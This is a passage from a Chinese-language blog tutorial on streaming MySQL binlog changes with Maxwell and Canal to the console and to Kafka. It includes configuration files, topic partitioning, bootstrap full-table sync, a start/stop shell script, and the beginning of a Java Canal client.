class="keyword">type</span><span class="string">":"</span><span class="keyword">update</span><span class="string">",</span></span><br><span class="line"><span class="string">    "</span>ts<span class="string">":1683960396,</span></span><br><span class="line"><span class="string">    "</span>xid<span class="string">":4737,</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">commit</span><span class="string">":true,</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">data</span><span class="string">":&#123;</span></span><br><span class="line"><span class="string">        "</span><span class="keyword">id</span><span class="string">":1,</span></span><br><span class="line"><span class="string">        "</span><span class="keyword">name</span><span class="string">":"</span>shawn<span class="string">" --修改后的数据</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">old</span><span class="string">":&#123; --修改前的数据</span></span><br><span class="line"><span class="string">        "</span><span class="keyword">name</span><span class="string">":"</span>aaa<span class="string">"</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"># 删除 test_maxwell 库的 test 表的一条数据，查看 maxwell 的控制台输出</span></span><br><span class="line"><span class="string">DELETE FROM test WHERE id=1;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">database</span><span class="string">":"</span>test_maxwell<span class="string">",</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">table</span><span class="string">":"</span><span class="keyword">test</span><span class="string">",</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">type</span><span class="string">":"</span><span class="keyword">delete</span><span class="string">",</span></span><br><span class="line"><span class="string">    "</span>ts<span class="string">":1683960501,</span></span><br><span class="line"><span class="string">    "</span>xid<span class="string">":5085,</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">commit</span><span class="string">":true,</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">data</span><span class="string">":&#123;</span></span><br><span class="line"><span class="string">        "</span><span class="keyword">id</span><span class="string">":1,</span></span><br><span class="line"><span class="string">        "</span><span class="keyword">name</span><span class="string">":"</span>shawn<span class="string">"</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-监控-Mysql-数据输出到-kafka">2.2 监控 Mysql 数据输出到 kafka</h3><p>简单接入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 zookeeper 和 kafka</span></span><br><span class="line">jpsall</span><br><span class="line"><span class="comment"># windows有个可视化工具，叫做kafka Tool</span></span><br><span class="line"><span class="comment"># https://www.kafkatool.com/download.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Maxwell 监控 binlog</span></span><br><span class="line">bin/maxwell --user=<span class="string">'maxwell'</span> --password=<span class="string">'123456'</span> --host=<span class="string">'hadoop102'</span> --producer=kafka --kafka.bootstrap.servers=hadoop102:9092   --kafka_topic=maxwell</span><br><span class="line"><span class="comment"># 打开 kafka 的控制台的消费者消费 maxwell 主题</span></span><br><span class="line"><span class="comment"># 如果要读取历史数据，需要加上--from-begining</span></span><br><span class="line">kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic maxwell</span><br></pre></td></tr></table></figure><p>然后就是<strong>kafka 主题数据的分区控制</strong>，在公司生产环境中，我们一般都会用 maxwell 监控多个 mysql 库的数据，然后将这些数据发往  kafka  的一个主题  Topic，并且这个主题也肯定是多分区的，为了提高并发度。那么如何控制这些数据的分区问题，就变得至关重要，实现步骤如下：在公司生产环境中，我们一般都会用 maxwell 监控多个 mysql 库的数据，然后将这些数据发往  kafka  的一个主题  Topic，并且这个主题也肯定是多分区的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改 maxwell 的配置文件，定制化启动 maxwell 进程</span></span><br><span class="line">vim config.properties</span><br><span class="line"></span><br><span class="line"><span class="comment">#   tl;dr   config</span></span><br><span class="line">log_level=info</span><br><span class="line"><span class="comment"># #Maxwell数据发送目的地，可选配置有stdout|file|kafka|kinesis|pubsub|sqs|rabbitmq|redis</span></span><br><span class="line">producer=kafka</span><br><span class="line">kafka.bootstrap.servers=hadoop102:9092</span><br><span class="line"> </span><br><span class="line"><span class="comment">#   mysql   login   info</span></span><br><span class="line">host=hadoop102</span><br><span class="line">user=maxwell</span><br><span class="line">password=123456</span><br><span class="line">jdbc_options=useSSL=<span class="literal">false</span>&amp;serverTimezone=Asia/Shanghai</span><br><span class="line"><span class="comment">#  ***   kafka   ***</span></span><br><span class="line"><span class="comment">#   list   of   kafka   brokers</span></span><br><span class="line"><span class="comment">#kafka.bootstrap.servers=hosta:9092,hostb:9092</span></span><br><span class="line"><span class="comment">#   kafka   topic   to   write   to</span></span><br><span class="line"><span class="comment">#   this   can   be   static,   e.g.   'maxwell',   or   dynamic,   e.g.namespace_%&#123;database&#125;_%&#123;table&#125;</span></span><br><span class="line"><span class="comment">#   in   the   latter   case   'database'   and   'table'   will   be   replacedwith   the   values   for   the   row   being   processed</span></span><br><span class="line"><span class="comment"># #目标Kafka topic，可静态配置，例如:maxwell，也可动态配置，例如：%&#123;database&#125;_%&#123;table&#125;</span></span><br><span class="line">kafka_topic=maxwell3</span><br><span class="line"></span><br><span class="line"><span class="comment">#  ***   partitioning   ***</span></span><br><span class="line"><span class="comment"># 一般都是库名或表分区</span></span><br><span class="line"><span class="comment">#   What   part   of   the   data   do   we   partition   by?</span></span><br><span class="line"><span class="comment">#producer_partition_by=database   #   [database,   table,primary_key,   transaction_id,   column]</span></span><br><span class="line">producer_partition_by=database</span><br><span class="line"></span><br><span class="line"><span class="comment">#   控制数据分区模式，可选模式有  库名，表名，主键，列名</span></span><br><span class="line"><span class="comment">#   specify   what   fields   to   partition   by   when   using producer_partition_by=column</span></span><br><span class="line"><span class="comment">#   column   separated   list.</span></span><br><span class="line"><span class="comment">#producer_partition_columns=name</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#   when   using   producer_partition_by=column,   partition   by   this when</span></span><br><span class="line"><span class="comment">#   the   specified   column(s)   don't   exist.</span></span><br><span class="line"><span class="comment">#producer_partition_by_fallback=database</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 手动创建一个 3 个分区的 topic，名字就叫做 maxwell3</span></span><br><span class="line">kafka-topics.sh --zookeeper hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka --create --replication-factor 2 --partitions 3 --topic maxwell3</span><br><span class="line"><span class="comment"># 利用配置文件启动 Maxwell 进程</span></span><br><span class="line">bin/maxwell --config ./config.properties</span><br><span class="line">/opt/module/maxwell/bin/maxwell --config /opt/module/maxwell/config.properties --daemon</span><br><span class="line"></span><br><span class="line">ps -ef | grep maxwell | grep -v grep | grep maxwell | awk <span class="string">'&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消费者</span></span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic maxwell3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向 test_maxwell 库的 test 表再次插入一条数据</span></span><br><span class="line">insert into test_maxwell.test values (6,<span class="string">'fff'</span>);</span><br><span class="line"><span class="comment"># 通过 kafka tool 工具查看，此条数据进入了 maxwell3 主题的 1 号分区</span></span><br><span class="line"><span class="comment"># 向 test_maxwell2 库的 aaa 表插入一条数据</span></span><br><span class="line"><span class="comment"># 注意binlog配置文件要监听这个库才行</span></span><br><span class="line">insert into test_maxwell2.test values (23,<span class="string">'dd'</span>);</span><br><span class="line"><span class="comment"># 通过 kafka  tool 工具查看，此条数据进入了 maxwell3 主题的 0 号分区,说明库名会对数据进入的分区造成影响</span></span><br></pre></td></tr></table></figure><h3 id="2-3-监控-Mysql-指定表数据输出控制台">2.3 监控 Mysql 指定表数据输出控制台</h3><p>运行 maxwell 来监控 mysql 指定表数据更新</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行 maxwell 来监控 mysql 指定表数据更新</span></span><br><span class="line">bin/maxwell --user=<span class="string">'maxwell'</span> --password=<span class="string">'123456'</span> --host=<span class="string">'hadoop102'</span> --filter <span class="string">'exclude: *.*, include:test_maxwell.test'</span> --producer=stdout</span><br><span class="line"><span class="comment"># 注：还可以设置 include:test_maxwell.*，通过此种方式来监控 mysql 某个库的所有表，也就是说过滤整个库</span></span><br></pre></td></tr></table></figure><h3 id="2-4-监控-Mysql-指定表全量数据输出控制台，数据初始化">2.4 监控 Mysql 指定表全量数据输出控制台，数据初始化</h3><blockquote><p><a href="https://maxwells-daemon.io/bootstrapping/" target="_blank" rel="noopener" title="https://maxwells-daemon.io/bootstrapping/">https://maxwells-daemon.io/bootstrapping/</a></p></blockquote><p>Maxwell 进程默认只能监控 mysql 的 binlog日志的新增及变化的数据，但是Maxwell 是支持数据初始化的，可以通过修改 Maxwell 的元数据，来对 MySQL 的某张表进行数据初始化，也就是我们常说的全量同步。具体操作步骤如下：需求：将 test_maxwell 库下的 test2 表的四条数据，全量导入到 maxwell 控制台进行打印</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改Maxwell的元数据，触发数据初始化机制，在 mysql 的 maxwell 库中 bootstrap表中插入一条数据，写明需要全量数据的库名和表名</span></span><br><span class="line">insert into maxwell.bootstrap(database_name,table_name) values(<span class="string">'test_maxwell'</span>,<span class="string">'test2'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 maxwell 进程，此时初始化程序会直接打印 test2 表的所有数据</span></span><br><span class="line">bin/maxwell --user=<span class="string">'maxwell'</span> --password=<span class="string">'123456'</span> --host=<span class="string">'hadoop102'</span> --producer=stdout</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当数据全部初始化完成以后，Maxwell 的元数据会变化</span></span><br><span class="line"><span class="comment"># is_complete  字段从 0 变为 1</span></span><br><span class="line"><span class="comment"># start_at  字段从 null 变为具体时间(数据同步开始时间)</span></span><br><span class="line"><span class="comment"># complete_at  字段从 null 变为具体时间(数据同步结束时间)</span></span><br></pre></td></tr></table></figure><p>还有一个方法是使用maxwell-bootstrap脚本，前提是已经启动了maxwell，否则会被阻塞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/opt/module/maxwell/bin/maxwell-bootstrap --database gmall --table user_info --config /opt/module/maxwell/config.properties</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一条type为bootstrap-start和最后一条type为bootstrap-complete的数据，是bootstrap开始和结束的标志，不包含数据，中间的type为bootstrap-insert的数据才包含数据。</span></span><br><span class="line"><span class="comment"># 一次bootstrap输出的所有记录的ts都相同，为bootstrap开始的时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 采用bootstrap方式同步的输出数据格式如下</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"database"</span>: <span class="string">"fooDB"</span>,</span><br><span class="line">    <span class="string">"table"</span>: <span class="string">"barTable"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"bootstrap-start"</span>,</span><br><span class="line">    <span class="string">"ts"</span>: 1450557744,</span><br><span class="line">    <span class="string">"data"</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"database"</span>: <span class="string">"fooDB"</span>,</span><br><span class="line">    <span class="string">"table"</span>: <span class="string">"barTable"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"bootstrap-insert"</span>,</span><br><span class="line">    <span class="string">"ts"</span>: 1450557744,</span><br><span class="line">    <span class="string">"data"</span>: &#123;</span><br><span class="line">        <span class="string">"txt"</span>: <span class="string">"hello"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"database"</span>: <span class="string">"fooDB"</span>,</span><br><span class="line">    <span class="string">"table"</span>: <span class="string">"barTable"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"bootstrap-insert"</span>,</span><br><span class="line">    <span class="string">"ts"</span>: 1450557744,</span><br><span class="line">    <span class="string">"data"</span>: &#123;</span><br><span class="line">        <span class="string">"txt"</span>: <span class="string">"bootstrap!"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"database"</span>: <span class="string">"fooDB"</span>,</span><br><span class="line">    <span class="string">"table"</span>: <span class="string">"barTable"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"bootstrap-complete"</span>,</span><br><span class="line">    <span class="string">"ts"</span>: 1450557744,</span><br><span class="line">    <span class="string">"data"</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-群起脚本">2.5 群起脚本</h3><p>一个启动脚本，可以参考</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">MAXWELL_HOME=/opt/module/maxwell</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">status_maxwell</span></span>()&#123;</span><br><span class="line">    result=`ps -ef | grep com.zendesk.maxwell.Maxwell | grep -v grep | wc -l`</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$result</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">start_maxwell</span></span>()&#123;</span><br><span class="line">    status_maxwell</span><br><span class="line">    <span class="keyword">if</span> [[ $? -lt 1 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"启动Maxwell"</span></span><br><span class="line">        <span class="variable">$MAXWELL_HOME</span>/bin/maxwell --config <span class="variable">$MAXWELL_HOME</span>/config.properties --daemon</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Maxwell正在运行"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">stop_maxwell</span></span>()&#123;</span><br><span class="line">    status_maxwell</span><br><span class="line">    <span class="keyword">if</span> [[ $? -gt 0 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"停止Maxwell"</span></span><br><span class="line">        ps -ef | grep com.zendesk.maxwell.Maxwell | grep -v grep | awk <span class="string">'&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Maxwell未在运行"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">    start )</span><br><span class="line">        start_maxwell</span><br><span class="line">    ;;</span><br><span class="line">    stop )</span><br><span class="line">        stop_maxwell</span><br><span class="line">    ;;</span><br><span class="line">    restart )</span><br><span class="line">       stop_maxwell</span><br><span class="line">       start_maxwell</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><h1>三、Canal使用</h1><h2 id="1、Canal-的下载和安装">1、Canal 的下载和安装</h2><h3 id="1-1-下载安装-v2">1.1 下载安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/alibaba/canal/releases</span></span><br><span class="line">wget https://github.com/alibaba/canal/releases/download/canal-1.1.2/canal.deployer-1.1.2.tar.gz</span><br><span class="line">mkdir /opt/module/canal</span><br><span class="line">tar -zxvf canal.deployer-1.1.2.tar.gz -C /opt/module/canal</span><br></pre></td></tr></table></figure><h3 id="1-2-mysql创建canal用户">1.2 mysql创建canal用户</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p123456</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> validate_password_length=<span class="number">4</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> validate_password_policy=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">REPLICATION</span> <span class="keyword">SLAVE</span>,<span class="keyword">REPLICATION</span> <span class="keyword">CLIENT</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'canal'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'canal'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在gmall-2021库下创建数据表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> user_info(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>),</span><br><span class="line"><span class="string">`name`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>),</span><br><span class="line"><span class="string">`sex`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="1-3-修改-canal-properties-的配置">1.3 修改 canal.properties 的配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/module/canal/conf</span><br><span class="line">vim canal.properties</span><br><span class="line"></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">######### common argument ############# </span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">canal.id = 1</span><br><span class="line">canal.ip =</span><br><span class="line">canal.port = 11111</span><br><span class="line">canal.metrics.pull.port = 11112</span><br><span class="line">canal.zkServers =</span><br><span class="line"><span class="comment"># flush data to zk</span></span><br><span class="line">canal.zookeeper.flush.period = 1000</span><br><span class="line">canal.withoutNetty = <span class="literal">false</span></span><br><span class="line"><span class="comment"># tcp, kafka, RocketMQ</span></span><br><span class="line">canal.serverMode = tcp</span><br><span class="line"><span class="comment"># flush meta cursor/parse position to file</span></span><br></pre></td></tr></table></figure><p><strong>说明：这个文件是 canal 的基本通用配置，canal 端口号默认就是 11111，修改 canal 的输出 model，默认 tcp，改为输出到 kafka</strong></p><p>多实例配置如果创建多个实例，通过前面 canal 架构，我们可以知道，一个 canal 服务中可以有多个 instance，conf/下的每一个 example 即是一个实例，每个实例下面都有独立的配置文件。默认只有一个实例 example，如果需要多个实例处理不同的 MySQL 数据的话，直接拷贝出多个 example，并对其重新命名，命名和配置文件中指定的名称一致，然后修改canal.properties 中的 <code>canal.destinations=实例1，实例2，实例3</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">######### destinations ############# </span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">canal.destinations = example</span><br></pre></td></tr></table></figure><h3 id="1-4-修改-instance-properties">1.4 修改 instance.properties</h3><p>我们这里只读取一个 MySQL 数据，所以只有一个实例，这个实例的配置文件在conf/example 目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/module/canal/conf/example</span><br><span class="line">vim instance.properties</span><br><span class="line"><span class="comment"># 配置 MySQL 服务器地址</span></span><br><span class="line"><span class="comment">## mysql serverId , v1.0.26+ will autoGen </span></span><br><span class="line">canal.instance.mysql.slaveId=20</span><br><span class="line"><span class="comment"># enable gtid use true/false</span></span><br><span class="line">canal.instance.gtidon=<span class="literal">false</span></span><br><span class="line"><span class="comment"># position info</span></span><br><span class="line">canal.instance.master.address=hadoop102:3306</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置连接 MySQL 的用户名和密码，默认就是我们前面授权的 canal</span></span><br><span class="line"><span class="comment"># username/password</span></span><br><span class="line">canal.instance.dbUsername=canal</span><br><span class="line">canal.instance.dbPassword=canal</span><br><span class="line">canal.instance.connectionCharset = UTF-8</span><br><span class="line">canal.instance.defaultDatabaseName =<span class="built_in">test</span></span><br><span class="line"><span class="comment"># enable druid Decrypt database password</span></span><br><span class="line">canal.instance.enableDruid=<span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="2、实时监控测试">2、实时监控测试</h2><h3 id="2-1-TCP-模式测试">2.1 TCP 模式测试</h3><p>首先创建项目，引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.otter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>canal.client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka-clients<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通用监视类–CanalClient</p><p><img src="http://qnypic.shawncoding.top/blog/202404151825988.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CanalClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException, InvalidProtocolBufferException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TODO 获取连接</span></span><br><span class="line">        CanalConnector canalConnector = CanalConnectors.newSingleConnector(<span class="keyword">new</span> InetSocketAddress(<span class="string">"hadoop102"</span>, <span class="number">11111</span>), <span class="string">"example"</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span 